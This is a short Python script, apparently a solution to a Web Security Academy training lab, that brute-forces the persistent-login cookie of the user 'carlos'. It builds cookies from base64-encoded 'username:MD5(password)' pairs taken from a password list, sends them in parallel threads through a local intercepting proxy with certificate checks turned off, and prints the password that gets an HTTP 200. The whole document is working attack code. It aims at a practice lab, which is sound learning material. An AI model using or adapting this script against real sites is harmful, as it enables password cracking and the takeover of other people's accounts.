import base64
import requests,urllib3,hashlib
from concurrent.futures import ThreadPoolExecutor

from credentials import passwords

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "127.0.0.1:8080",
    "https" : "127.0.0.1:8080",
}

url = "https://0aee00fb032efa5a80a3f8860026002a.web-security-academy.net/my-account?id=carlos"



def crack_password(password):

    raw_value = f"carlos:{hashlib.md5(password.encode()).hexdigest()}"
    cookies = {
        "stay-logged-in": base64.b64encode(raw_value.encode()).decode(),
    }
    response = requests.get(url=url,cookies=cookies,proxies=proxies,verify=False,allow_redirects=False)

    if response.status_code == 200:
        return password
    return None


with ThreadPoolExecutor(max_workers=5) as executer:
    for password in executer.map(crack_password,passwords):
        if password :
            print("password = ",password)
            break